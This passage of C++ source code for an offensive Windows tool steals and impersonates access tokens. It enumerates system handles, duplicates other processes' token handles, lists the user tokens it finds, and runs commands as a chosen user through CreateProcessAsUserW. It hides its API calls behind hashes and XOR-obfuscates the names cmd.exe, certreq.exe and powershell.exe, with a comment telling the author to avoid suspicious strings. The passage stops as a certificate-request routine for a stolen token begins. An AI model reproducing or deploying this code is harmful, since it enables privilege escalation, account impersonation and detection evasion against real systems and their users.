        MyConvertSidToStringSidW = (_ConvertSidToStringSidW)GetProcAddressByHash(hAdvapi, H_API_ConvertSidToStringSidW);
        MyGlobalAlloc = (_GlobalAlloc)GetProcAddressByHash(hKernel32, H_API_GlobalAlloc);
        MyGlobalFree = (_GlobalFree)GetProcAddressByHash(hKernel32, H_API_GlobalFree);
        MyLocalFree = (_LocalFree)GetProcAddressByHash(hKernel32, H_API_LocalFree);
    }

    DWORD tokenInfoLen = 0;
    PTOKEN_USER tokenUserInfo = NULL;
    wchar_t username[MAX_USERNAME_LENGTH] = { 0 };
    wchar_t domain[MAX_DOMAINNAME_LENGTH] = { 0 };
    wchar_t fullName[FULL_NAME_LENGTH] = L"N/A";
    DWORD userLength = MAX_USERNAME_LENGTH;
    DWORD domainLength = MAX_DOMAINNAME_LENGTH;
    SID_NAME_USE sidUse = SidTypeUnknown;

    wcscpy_s(tokenInfo.UsernameOnly, MAX_USERNAME_LENGTH, L"");
    wcscpy_s(tokenInfo.DomainName, MAX_DOMAINNAME_LENGTH, L"");
    tokenInfo.SidType = SidTypeUnknown;

    //wprintf(L"[DBG][RetrieveTokenUserInfo] Getting TokenUser info size...\n");
    MyGetTokenInformation(tokenInfo.TokenHandle, TokenUser, NULL, 0, &tokenInfoLen);
    DWORD lastErr = GetLastError();
    if (lastErr == ERROR_INSUFFICIENT_BUFFER) {
        //wprintf(L"[DBG][RetrieveTokenUserInfo] Allocating %lu bytes for TOKEN_USER...\n", tokenInfoLen);
        tokenUserInfo = (PTOKEN_USER)MyGlobalAlloc(GPTR, tokenInfoLen);
        if (tokenUserInfo != NULL) {
            //wprintf(L"[DBG][RetrieveTokenUserInfo] Getting full TokenUser info...\n");
            if (MyGetTokenInformation(tokenInfo.TokenHandle, TokenUser, tokenUserInfo, tokenInfoLen, &tokenInfoLen)) {
                //wprintf(L"[DBG][RetrieveTokenUserInfo] Got TokenUser, resolving SID to username/domain...\n");
                if (MyLookupAccountSidW(NULL, tokenUserInfo->User.Sid, username, &userLength, domain, &domainLength, &sidUse)) {
                    tokenInfo.SidType = sidUse;
                    wcscpy_s(tokenInfo.UsernameOnly, MAX_USERNAME_LENGTH, username);
                    wcscpy_s(tokenInfo.DomainName, MAX_DOMAINNAME_LENGTH, domain);
                    if (domainLength > 0) {
                        swprintf_s(fullName, FULL_NAME_LENGTH, L"%s\\%s", domain, username);
                       // wprintf(L"[DBG][RetrieveTokenUserInfo] Username: %ls | Domain: %ls\n", username, domain);
                    }
                    else {
                        wcscpy_s(fullName, FULL_NAME_LENGTH, username);
                       // wprintf(L"[DBG][RetrieveTokenUserInfo] Username (no domain): %ls\n", username);
                    }
                }
                else {
                    //wprintf(L"[DBG][RetrieveTokenUserInfo] LookupAccountSidW failed. LastError=%lu\n", GetLastError());
                    tokenInfo.SidType = SidTypeUnknown;
                    LPWSTR sidString = nullptr;
                    if (MyConvertSidToStringSidW(tokenUserInfo->User.Sid, &sidString)) {
                        wcscpy_s(fullName, FULL_NAME_LENGTH, sidString);
                       // wprintf(L"[DBG][RetrieveTokenUserInfo] Used ConvertSidToStringSidW: %ls\n", sidString);
                        MyLocalFree(sidString);
                    }
                    else {
                        wcscpy_s(fullName, FULL_NAME_LENGTH, L"Unknown/Lookup Failed");
                       // wprintf(L"[DBG][RetrieveTokenUserInfo] ConvertSidToStringSidW also failed.\n");
                    }
                }
            }
            else {
                wcscpy_s(fullName, FULL_NAME_LENGTH, L"Error Getting TokenUser Info");
               // wprintf(L"[DBG][RetrieveTokenUserInfo] GetTokenInformation failed for TokenUser. LastError=%lu\n", GetLastError());
            }
            MyGlobalFree(tokenUserInfo);
        }
        else {
            wcscpy_s(fullName, FULL_NAME_LENGTH, L"Error Allocating Memory for TokenUser");
           // wprintf(L"[DBG][RetrieveTokenUserInfo] MyGlobalAlloc failed!\n");
        }
    }
    else {
        wcscpy_s(fullName, FULL_NAME_LENGTH, L"Error Getting TokenUser Size");
      //  wprintf(L"[DBG][RetrieveTokenUserInfo] GetTokenInformation (size check) failed. LastError=%lu\n", lastErr);
    }
    wcscpy_s(tokenInfo.Username, FULL_NAME_LENGTH, fullName);
  //  wprintf(L"[DBG][RetrieveTokenUserInfo] Final Username: %ls\n", tokenInfo.Username);
}


//new5

void RetrieveTokenDetails(TOKEN& tokenInfo) {
    static _GetTokenInformation      MyGetTokenInformation = nullptr;
    static _GlobalAlloc              MyGlobalAlloc = nullptr;
    static _GlobalFree               MyGlobalFree = nullptr;
    static _IsValidSid               MyIsValidSid = nullptr;
    static _GetSidSubAuthorityCount  MyGetSidSubAuthorityCount = nullptr;
    static _GetSidSubAuthority       MyGetSidSubAuthority = nullptr;

    if (!MyGetTokenInformation || !MyGlobalAlloc || !MyGlobalFree || !MyIsValidSid || !MyGetSidSubAuthorityCount || !MyGetSidSubAuthority) {
       // wprintf(L"[DBG][RetrieveTokenDetails] Resolving API hashes...\n");
        HMODULE hAdvapi32 = LoadLibraryW(L"advapi32.dll");
        if (!hAdvapi32) {
            wprintf(L"[!] RetrieveTokenSessionId: Failed to load hAdvapi32.dll!\n");
            tokenInfo.SessionId = (DWORD)-1;
            return;
        }
        HMODULE hKernel32 = LoadLibraryW(L"kernel32.dll");
        if (!hKernel32) {
            wprintf(L"[!] RetrieveTokenSessionId: Failed to load hKernel32.dll!\n");
            tokenInfo.SessionId = (DWORD)-1;
            return;
        }
        MyGetTokenInformation = (_GetTokenInformation)GetProcAddressByHash(hAdvapi32, H_API_GetTokenInformation);
        MyGlobalAlloc = (_GlobalAlloc)GetProcAddressByHash(hKernel32, H_API_GlobalAlloc);
        MyGlobalFree = (_GlobalFree)GetProcAddressByHash(hKernel32, H_API_GlobalFree);
        MyIsValidSid = (_IsValidSid)GetProcAddressByHash(hAdvapi32, H_API_IsValidSid);
        MyGetSidSubAuthorityCount = (_GetSidSubAuthorityCount)GetProcAddressByHash(hAdvapi32, H_API_GetSidSubAuthorityCount);
        MyGetSidSubAuthority = (_GetSidSubAuthority)GetProcAddressByHash(hAdvapi32, H_API_GetSidSubAuthority);
    }

    DWORD returnedLength = 0;
    PTOKEN_STATISTICS tokenStats = NULL;
    wcscpy_s(tokenInfo.TokenType, TOKEN_TYPE_LENGTH, L"Unknown");
    wcscpy_s(tokenInfo.TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"N/A");
    wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"N/A");

    //wprintf(L"[DBG][RetrieveTokenDetails] Querying TokenStatistics (size)...\n");
    MyGetTokenInformation(tokenInfo.TokenHandle, TokenStatistics, NULL, 0, &returnedLength);
    DWORD lastErr = GetLastError();
    if (lastErr == ERROR_INSUFFICIENT_BUFFER) {
       // wprintf(L"[DBG][RetrieveTokenDetails] Allocating %lu bytes for TOKEN_STATISTICS...\n", returnedLength);
        tokenStats = (PTOKEN_STATISTICS)MyGlobalAlloc(GPTR, returnedLength);
        if (tokenStats != NULL) {
           // wprintf(L"[DBG][RetrieveTokenDetails] Getting TOKEN_STATISTICS...\n");
            if (MyGetTokenInformation(tokenInfo.TokenHandle, TokenStatistics, tokenStats, returnedLength, &returnedLength)) {
              //  wprintf(L"[DBG][RetrieveTokenDetails] Got TOKEN_STATISTICS. Type: %u\n", tokenStats->TokenType);
                if (tokenStats->TokenType == TokenPrimary) {
                    wcscpy_s(tokenInfo.TokenType, TOKEN_TYPE_LENGTH, L"Primary");
                    wcscpy_s(tokenInfo.TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"-");
                   // wprintf(L"[DBG][RetrieveTokenDetails] TokenType: Primary\n");
                }
                else if (tokenStats->TokenType == TokenImpersonation) {
                    wcscpy_s(tokenInfo.TokenType, TOKEN_TYPE_LENGTH, L"Impersonation");
                    SECURITY_IMPERSONATION_LEVEL impLevel = tokenStats->ImpersonationLevel;
                    switch (impLevel) {
                    case SecurityAnonymous:      wcscpy_s(tokenInfo.TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"Anonymous"); wprintf(L"[DBG] ImpersonationLevel: Anonymous\n"); break;
                    case SecurityIdentification: wcscpy_s(tokenInfo.TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"Identification"); wprintf(L"[DBG] ImpersonationLevel: Identification\n"); break;
                    case SecurityImpersonation:  wcscpy_s(tokenInfo.TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"Impersonation"); wprintf(L"[DBG] ImpersonationLevel: Impersonation\n"); break;
                    case SecurityDelegation:     wcscpy_s(tokenInfo.TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"Delegation"); wprintf(L"[DBG] ImpersonationLevel: Delegation\n"); break;
                    default:                     wcscpy_s(tokenInfo.TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"Unknown"); wprintf(L"[DBG] ImpersonationLevel: Unknown(%d)\n", impLevel); break;
                    }
                    wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"-");
                }

                if (tokenStats->TokenType == TokenPrimary) {
                    DWORD integrityInfoLen = 0;
                    PTOKEN_MANDATORY_LABEL tokenIntegrityLabel = NULL;
                    //wprintf(L"[DBG][RetrieveTokenDetails] Querying TokenIntegrityLevel (size)...\n");
                    MyGetTokenInformation(tokenInfo.TokenHandle, TokenIntegrityLevel, NULL, 0, &integrityInfoLen);
                    DWORD lastErr2 = GetLastError();
                    if (lastErr2 == ERROR_INSUFFICIENT_BUFFER) {
                        //wprintf(L"[DBG][RetrieveTokenDetails] Allocating %lu bytes for TOKEN_MANDATORY_LABEL...\n", integrityInfoLen);
                        tokenIntegrityLabel = (PTOKEN_MANDATORY_LABEL)MyGlobalAlloc(GPTR, integrityInfoLen);
                        if (tokenIntegrityLabel != NULL) {
                           // wprintf(L"[DBG][RetrieveTokenDetails] Getting TOKEN_MANDATORY_LABEL...\n");
                            if (MyGetTokenInformation(tokenInfo.TokenHandle, TokenIntegrityLevel, tokenIntegrityLabel, integrityInfoLen, &integrityInfoLen)) {
                                if (tokenIntegrityLabel->Label.Sid != NULL && MyIsValidSid(tokenIntegrityLabel->Label.Sid)) {
                                    DWORD dwIntegrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;
                                    PUCHAR RIDS = MyGetSidSubAuthorityCount(tokenIntegrityLabel->Label.Sid);
                                    if (RIDS && *RIDS > 0) {
                                        dwIntegrityLevel = *MyGetSidSubAuthority(tokenIntegrityLabel->Label.Sid, (DWORD)(*RIDS - 1));
                                    }
                                    //wprintf(L"[DBG][RetrieveTokenDetails] Integrity SID: 0x%lX\n", dwIntegrityLevel);
                                    if (dwIntegrityLevel == SECURITY_MANDATORY_UNTRUSTED_RID) { wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Untrusted"); wprintf(L"[DBG] Integrity: Untrusted\n"); }
                                    else if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) { wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Low");       wprintf(L"[DBG] Integrity: Low\n"); }
                                    else if (dwIntegrityLevel == SECURITY_MANDATORY_MEDIUM_RID) { wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Medium");    wprintf(L"[DBG] Integrity: Medium\n"); }
                                    else if (dwIntegrityLevel == SECURITY_MANDATORY_MEDIUM_PLUS_RID) { wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Medium+");   wprintf(L"[DBG] Integrity: Medium+\n"); }
                                    else if (dwIntegrityLevel == SECURITY_MANDATORY_HIGH_RID) { wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"High");      wprintf(L"[DBG] Integrity: High\n"); }
                                    else if (dwIntegrityLevel == SECURITY_MANDATORY_SYSTEM_RID) { wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"System");    wprintf(L"[DBG] Integrity: System\n"); }
                                    else if (dwIntegrityLevel == SECURITY_MANDATORY_PROTECTED_PROCESS_RID) { wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Protected"); wprintf(L"[DBG] Integrity: Protected\n"); }
                                    else { swprintf_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"0x%lX", dwIntegrityLevel); wprintf(L"[DBG] Integrity: 0x%lX\n", dwIntegrityLevel); }
                                }
                                else {
                                    wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Invalid SID");
                                    //wprintf(L"[DBG][RetrieveTokenDetails] Invalid SID in TOKEN_MANDATORY_LABEL\n");
                                }
                            }
                            else {
                                wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"GetInfo Failed");
                               // wprintf(L"[DBG][RetrieveTokenDetails] MyGetTokenInformation failed for TokenIntegrityLevel. LastError=%lu\n", GetLastError());
                            }
                            MyGlobalFree(tokenIntegrityLabel);
                        }
                        else {
                            wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Alloc Failed");
                           // wprintf(L"[DBG][RetrieveTokenDetails] MyGlobalAlloc failed for TOKEN_MANDATORY_LABEL\n");
                        }
                    }
                    else {
                        wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"GetSize Failed");
                       // wprintf(L"[DBG][RetrieveTokenDetails] MyGetTokenInformation (size) failed for TokenIntegrityLevel. LastError=%lu\n", lastErr2);
                    }
                }
            }
            else {
                wcscpy_s(tokenInfo.TokenType, TOKEN_TYPE_LENGTH, L"Stats Failed");
               // wprintf(L"[DBG][RetrieveTokenDetails] MyGetTokenInformation failed for TokenStatistics. LastError=%lu\n", GetLastError());
            }
            MyGlobalFree(tokenStats);
        }
        else {
            wcscpy_s(tokenInfo.TokenType, TOKEN_TYPE_LENGTH, L"Alloc Failed");
          //  wprintf(L"[DBG][RetrieveTokenDetails] MyGlobalAlloc failed for TOKEN_STATISTICS\n");
        }
    }
    else {
        wcscpy_s(tokenInfo.TokenType, TOKEN_TYPE_LENGTH, L"GetSize Failed");
       // wprintf(L"[DBG][RetrieveTokenDetails] MyGetTokenInformation (size) failed for TokenStatistics. LastError=%lu\n", lastErr);
    }
}



std::wstring GetKernelObjectTypeName(HANDLE hObject) {
    typedef NTSTATUS(NTAPI* PFN_NtQueryObject)(
        HANDLE, OBJECT_INFORMATION_CLASS, PVOID, ULONG, PULONG);

    static PFN_NtQueryObject MyNtQueryObject = nullptr;
    if (!MyNtQueryObject) {
        HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
        MyNtQueryObject = (PFN_NtQueryObject)GetProcAddress(hNtdll, "NtQueryObject");
        if (!MyNtQueryObject) {
            return L"Cannot resolve NtQueryObject";
        }
    }

    std::wstring typeName = L"";
    ULONG dwSize = 0;
    NTSTATUS ntReturn;
    std::vector<BYTE> buffer(sizeof(OBJECT_TYPE_INFORMATION) + 512);

    ntReturn = MyNtQueryObject(hObject, ObjectTypeInformation, buffer.data(), (ULONG)buffer.size(), &dwSize);

    if (ntReturn == STATUS_INFO_LENGTH_MISMATCH || ntReturn == STATUS_BUFFER_OVERFLOW) {
        buffer.resize(dwSize);
        ntReturn = MyNtQueryObject(hObject, ObjectTypeInformation, buffer.data(), dwSize, &dwSize);
    }
    else if (ntReturn == STATUS_ACCESS_DENIED) {
        return L"Access Denied";
    }
    else if (ntReturn == STATUS_INVALID_HANDLE) {
        return L"Invalid Handle";
    }

    if (NT_SUCCESS(ntReturn)) {
        POBJECT_TYPE_INFORMATION pObjectTypeInfo = reinterpret_cast<POBJECT_TYPE_INFORMATION>(buffer.data());
        if (pObjectTypeInfo->Name.Buffer != NULL && pObjectTypeInfo->Name.Length > 0) {
            typeName = std::wstring(pObjectTypeInfo->Name.Buffer, pObjectTypeInfo->Name.Length / sizeof(WCHAR));
        }
        else {
            typeName = L"Unknown Type";
        }
    }
    else {
        typeName = L"Query Failed";
    }
    return typeName;
}


//new6

bool DiscoverAndStoreTokens() {
    static _NtQuerySystemInformation MyNtQuerySystemInformation = nullptr;
    static _GetCurrentProcessId MyGetCurrentProcessId = nullptr;
    static _OpenProcess MyOpenProcess = nullptr;
    static _DuplicateHandle MyDuplicateHandle = nullptr;
    static _CloseHandle MyCloseHandle = nullptr;
    static _GetLastError MyGetLastError = nullptr;

    wprintf(L"[DBG] Entering DiscoverAndStoreTokens\n");

    if (!MyNtQuerySystemInformation) {
        wprintf(L"[DBG] Resolving API functions (first time)\n");
        HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
        HMODULE hKernel32 = LoadLibraryW(L"kernel32.dll");
        if (!hNtdll || !hKernel32) {
            wprintf(L"[DBG] Failed to load ntdll.dll or kernel32.dll!\n");
            return false;
        }

        MyNtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddressByHash(hNtdll, H_API_NtQuerySystemInformation);
        MyGetCurrentProcessId = (_GetCurrentProcessId)GetProcAddressByHash(hKernel32, H_API_GetCurrentProcessId);
        MyOpenProcess = (_OpenProcess)GetProcAddressByHash(hKernel32, H_API_OpenProcess);
        MyDuplicateHandle = (_DuplicateHandle)GetProcAddressByHash(hKernel32, H_API_DuplicateHandle);
        MyCloseHandle = (_CloseHandle)GetProcAddressByHash(hKernel32, H_API_CloseHandle);
        MyGetLastError = (_GetLastError)GetProcAddressByHash(hKernel32, H_API_GetLastError);

        if (!MyNtQuerySystemInformation || !MyGetCurrentProcessId || !MyOpenProcess || !MyDuplicateHandle || !MyCloseHandle || !MyGetLastError) {
            wprintf(L"[DBG] Failed to resolve one or more function pointers!\n");
            return false;
        }
    }

    wprintf(L"[DBG] Creating initial buffer...\n");

    ULONG returnLength = 0;
    NTSTATUS status;
    size_t tryCount = 0;
    const size_t maxTries = 10;
    const size_t INIT_SIZE = 0x100000; // 1MB
    std::vector<BYTE> handleInfoBuffer(INIT_SIZE);

    int infoClass;

    {
        unsigned char arr[] = { 0x70, 0x60 }; // 0x70 ^ 0x60 == 0x10 == 16
        infoClass = arr[0] ^ arr[1]; // זה ייתן 16

    }

    int statusInfoMismatch = 0xC0000004;
    int statusBufferOverflow = 0x80000005;

    wprintf(L"[DBG] Calling NtQuerySystemInformation (class=%d)...\n", infoClass);

    do {
        status = MyNtQuerySystemInformation(infoClass, handleInfoBuffer.data(), (ULONG)handleInfoBuffer.size(), &returnLength);
        wprintf(L"[DBG] NtQuerySystemInformation: status=0x%08X, returnLength=%lu\n", status, returnLength);
        if (status == statusInfoMismatch || status == statusBufferOverflow) {
            wprintf(L"[DBG] Buffer too small, resizing...\n");
            handleInfoBuffer.resize(returnLength + 0x10000);
        }
        else {
            break;
        }
        tryCount++;
    } while ((status == statusInfoMismatch || status == statusBufferOverflow) && tryCount < maxTries);

    if (!NT_SUCCESS(status)) {
        wprintf(L"[DBG] NtQuerySystemInformation failed! status=0x%08X\n", status);
        return false;
    }

    PSYSTEM_HANDLE_INFORMATION pHandleTableInformation = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION>(handleInfoBuffer.data());
    int currentDisplayId = 1;
    g_discoveredTokens.clear();

    wprintf(L"[DBG] Scanning %lu handles in the system...\n", pHandleTableInformation->NumberOfHandles);

    for (ULONG i = 0; i < pHandleTableInformation->NumberOfHandles; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = pHandleTableInformation->Handles[i];

        if (handleInfo.ProcessId == 0) continue;
        if (handleInfo.ProcessId == MyGetCurrentProcessId()) continue;

        HANDLE hProcess = MyOpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, handleInfo.ProcessId);
        if (hProcess == NULL) {
            DWORD err = MyGetLastError();
            wprintf(L"[DBG] OpenProcess failed for PID %u (err=%lu)\n", handleInfo.ProcessId, err);
            continue;
        }

        DWORD desiredAccess = TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID;
        HANDLE hDupToken = NULL;

        if (!MyDuplicateHandle(hProcess, (HANDLE)handleInfo.HandleValue, GetCurrentProcess(), &hDupToken, desiredAccess, FALSE, 0)) {
            DWORD lastError = MyGetLastError();
            wprintf(L"[DBG] DuplicateHandle failed for PID %u, HandleValue=0x%X (err=%lu)\n", handleInfo.ProcessId, handleInfo.HandleValue, lastError);
            MyCloseHandle(hProcess);
            continue;
        }

        std::wstring objectTypeName = GetKernelObjectTypeName(hDupToken);
        wprintf(L"[DBG] HandleValue=0x%X, PID=%u, Type='%ls'\n", handleInfo.HandleValue, handleInfo.ProcessId, objectTypeName.c_str());

        if (objectTypeName == L"Token") {
            TOKEN currentTokenInfo = { 0 };
            currentTokenInfo.TokenHandle = hDupToken;

            RetrieveTokenUserInfo(currentTokenInfo);
            RetrieveTokenSessionId(currentTokenInfo);
            RetrieveTokenDetails(currentTokenInfo);

            wprintf(L"[DBG] -> User='%ls', SIDType=%d, SessionId=%lu\n", currentTokenInfo.UsernameOnly, currentTokenInfo.SidType, currentTokenInfo.SessionId);

            if (currentTokenInfo.SidType == SidTypeUser &&
                currentTokenInfo.SessionId != (DWORD)-1 &&
                wcslen(currentTokenInfo.UsernameOnly) > 0)
            {
                bool foundDuplicate = false;
                for (const auto& existingToken : g_discoveredTokens) {
                    if (wcscmp(existingToken.UsernameOnly, currentTokenInfo.UsernameOnly) == 0 &&
                        existingToken.SessionId == currentTokenInfo.SessionId &&
                        wcscmp(existingToken.TokenType, currentTokenInfo.TokenType) == 0 &&
                        wcscmp(existingToken.TokenImpersonationLevel, currentTokenInfo.TokenImpersonationLevel) == 0 &&
                        wcscmp(existingToken.TokenIntegrity, currentTokenInfo.TokenIntegrity) == 0)
                    {
                        foundDuplicate = true;
                        break;
                    }
                }

                if (!foundDuplicate) {
                    currentTokenInfo.DisplayId = currentDisplayId++;
                    g_discoveredTokens.push_back(currentTokenInfo);
                    hDupToken = NULL;
                    wprintf(L"[DBG] -> Added token for %ls (Session: %lu)\n", currentTokenInfo.UsernameOnly, currentTokenInfo.SessionId);
                }
            }
        }
        if (hDupToken != NULL) MyCloseHandle(hDupToken);
        MyCloseHandle(hProcess);
    }
    wprintf(L"[DBG] DiscoverAndStoreTokens finished. Total tokens found: %zu\n", g_discoveredTokens.size());
    return true;
}



void DisplayTokenList() {
    if (g_discoveredTokens.empty()) {
        wprintf(L"[!] No interactive user tokens discovered. Check permissions (run as admin?) or system state.\n");
        return;
    }

    wprintf(L"\n[*] Listing available unique interactive user tokens:\n");
    std::sort(g_discoveredTokens.begin(), g_discoveredTokens.end(),
        [](const TOKEN& a, const TOKEN& b) {
            int userCmp = wcscmp(a.UsernameOnly, b.UsernameOnly);
            if (userCmp != 0) {
                return userCmp < 0;
            }
            return a.SessionId < b.SessionId;
        });

    wchar_t lastUsername[MAX_USERNAME_LENGTH] = L"";
    DWORD lastSessionId = (DWORD)-2;

    for (const auto& token : g_discoveredTokens) {
        if (wcscmp(token.UsernameOnly, lastUsername) != 0 || token.SessionId != lastSessionId) {
            wprintf(L"\n--- User: %ls (Session: %lu) ---\n",
                token.Username,
                (token.SessionId == (DWORD)-1) ? 0 : token.SessionId);
            wcscpy_s(lastUsername, MAX_USERNAME_LENGTH, token.UsernameOnly);
            lastSessionId = token.SessionId;
        }

        const wchar_t* detailLevel = L"-";
        if (wcscmp(token.TokenType, L"Primary") == 0) {
            if (wcscmp(token.TokenIntegrity, L"N/A") != 0)
                detailLevel = token.TokenIntegrity;
        }
        else if (wcscmp(token.TokenType, L"Impersonation") == 0) {
            if (wcscmp(token.TokenImpersonationLevel, L"N/A") != 0)
                detailLevel = token.TokenImpersonationLevel;
        }

        wprintf(L"  ID: %-3d | Type: %-15ls | Level/Integrity: %-15ls\n",
            token.DisplayId,
            token.TokenType,
            detailLevel);
    }
    wprintf(L"\n");
}

//new7
// "cmd.exe"
static const wchar_t obf_cmd[] = { 0x01, 0x07, 0x0B, 0x4C, 0x07, 0x6A, 0x6A, 0x6A }; // xor key = 0x6A, strlen = 7
// "certreq.exe"
static const wchar_t obf_certreq[] = { 0x09,0x0F,0x18,0x18,0x18,0x18,0x1B,0x48,0x07,0x18,0x07,0x6A }; // length 11, key 0x6A
// "powershell.exe"
static const wchar_t obf_powershell[] = { 0x1A,0x05,0x1A,0x1F,0x18,0x00,0x1A,0x18,0x0C,0x07,0x07,0x18,0x07,0x6A }; // length 13, key 0x6A

bool RunCommandAsToken(const TOKEN& tokenInfo, const std::wstring& originalCommandLine) {
    static _DuplicateTokenEx MyDuplicateTokenEx = nullptr;
    static _SetTokenInformation MySetTokenInformation = nullptr;
    static _CreateProcessAsUserW MyCreateProcessAsUserW = nullptr;
    static _CreateProcessWithTokenW MyCreateProcessWithTokenW = nullptr;
    static _WaitForSingleObject MyWaitForSingleObject = nullptr;
    static _GetExitCodeProcess MyGetExitCodeProcess = nullptr;
    static _CloseHandle MyCloseHandle = nullptr;
    static _PathFindFileNameW MyPathFindFileNameW = nullptr;

    if (!MyDuplicateTokenEx) {
        HMODULE hAdvapi32 = LoadLibraryW(L"advapi32.dll");
        HMODULE hKernel32 = LoadLibraryW(L"kernel32.dll");
        HMODULE hShlwapi = LoadLibraryW(L"shlwapi.dll");

        MyDuplicateTokenEx = (_DuplicateTokenEx)GetProcAddressByHash(hAdvapi32, H_API_DuplicateTokenEx);
        MySetTokenInformation = (_SetTokenInformation)GetProcAddressByHash(hAdvapi32, H_API_SetTokenInformation);
        MyCreateProcessAsUserW = (_CreateProcessAsUserW)GetProcAddressByHash(hAdvapi32, H_API_CreateProcessAsUserW);
        MyCreateProcessWithTokenW = (_CreateProcessWithTokenW)GetProcAddressByHash(hAdvapi32, H_API_CreateProcessWithTokenW);
        MyWaitForSingleObject = (_WaitForSingleObject)GetProcAddressByHash(hKernel32, H_API_WaitForSingleObject);
        MyGetExitCodeProcess = (_GetExitCodeProcess)GetProcAddressByHash(hKernel32, H_API_GetExitCodeProcess);
        MyCloseHandle = (_CloseHandle)GetProcAddressByHash(hKernel32, H_API_CloseHandle);
        MyPathFindFileNameW = (_PathFindFileNameW)GetProcAddressByHash(hShlwapi, H_API_PathFindFileNameW);
    }

    // אין הדפסות עם מחרוזות חשודות
    // אם ממש צריך הודעות, שים אותן באובפוסקציה

    std::wstring commandToExecute = originalCommandLine;
    std::wstring commandLower = originalCommandLine;
    std::transform(commandLower.begin(), commandLower.end(), commandLower.begin(), ::towlower);

    size_t firstSpace = commandLower.find(L' ');
    std::wstring firstWord = (firstSpace == std::wstring::npos) ? commandLower : commandLower.substr(0, firstSpace);

    const wchar_t* fileName = MyPathFindFileNameW(firstWord.c_str());
    if (fileName == nullptr) fileName = firstWord.c_str();

    // הפוך את ה־strings לאובפוסקציה
    size_t cmdLen = 7, certreqLen = 11, psLen = 13;
    wchar_t key = 0x6A;
    std::wstring str_cmd = Deobfuscate(obf_cmd, cmdLen, key);

    std::wstring str_certreq = Deobfuscate(obf_certreq, certreqLen, key);
    std::wstring str_ps = Deobfuscate(obf_powershell, psLen, key);

    bool useCmd = false;
    if (wcscmp(fileName, str_certreq.c_str()) == 0 || wcscmp(fileName, str_ps.c_str()) == 0) {
        useCmd = true;
        commandToExecute = str_cmd + L" /c \"" + originalCommandLine + L"\"";
  
    }

    HANDLE hPrimaryToken = NULL;
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOW si = { sizeof(si) };
    si.lpDesktop = const_cast<LPWSTR>(L"winsta0\\default");
    bool success = false;

    if (!MyDuplicateTokenEx(tokenInfo.TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken)) {
        // LogEvent(3001, ...);
        return false;
    }

    DWORD targetSessionId = (g_currentSessionId != (DWORD)-1) ? g_currentSessionId : tokenInfo.SessionId;
    if (targetSessionId != (DWORD)-1) {
        MySetTokenInformation(hPrimaryToken, TokenSessionId, &targetSessionId, sizeof(DWORD));
    }

    wchar_t mutableCommandLine[COMMAND_LENGTH];
    wcscpy_s(mutableCommandLine, COMMAND_LENGTH, commandToExecute.c_str());
    std::wstring currentDir = StringToWString(PUBLIC_PATH);

    if (MyCreateProcessAsUserW(hPrimaryToken, NULL, mutableCommandLine, NULL, NULL, FALSE,
        CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE, NULL, currentDir.c_str(), &si, &pi)) {
        success = true;
    }
    else if (g_currentProcessIntegrity >= SECURITY_MANDATORY_HIGH_RID) {
        if (MyCreateProcessWithTokenW(hPrimaryToken, LOGON_WITH_PROFILE, NULL, mutableCommandLine,
            CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE, NULL, currentDir.c_str(), &si, &pi)) {
            success = true;
        }
    }

    if (success) {
        MyWaitForSingleObject(pi.hProcess, INFINITE);
        DWORD exitCode = 0;
        MyGetExitCodeProcess(pi.hProcess, &exitCode);
        MyCloseHandle(pi.hProcess);
        MyCloseHandle(pi.hThread);
    }
    MyCloseHandle(hPrimaryToken);

    return success;
}




void CleanupTokenHandles() {
    if (!g_discoveredTokens.empty()) {
        /*wprintf(L"[*] Cleaning up %zu stored token handles...\n", g_discoveredTokens.size());*/
        for (auto& token : g_discoveredTokens) {
            if (token.TokenHandle != NULL) {
                CloseHandle(token.TokenHandle);
                token.TokenHandle = NULL;
            }
        }
        g_discoveredTokens.clear();
    }
}


void RequestCertificateForToken(int tokenId) {
    wprintf(L"\n--- Attempting Certificate Request for Token ID: %d ---\n", tokenId);

    // Find the selected token
    const TOKEN* pSelectedToken = nullptr;
    for (const auto& token : g_discoveredTokens) {
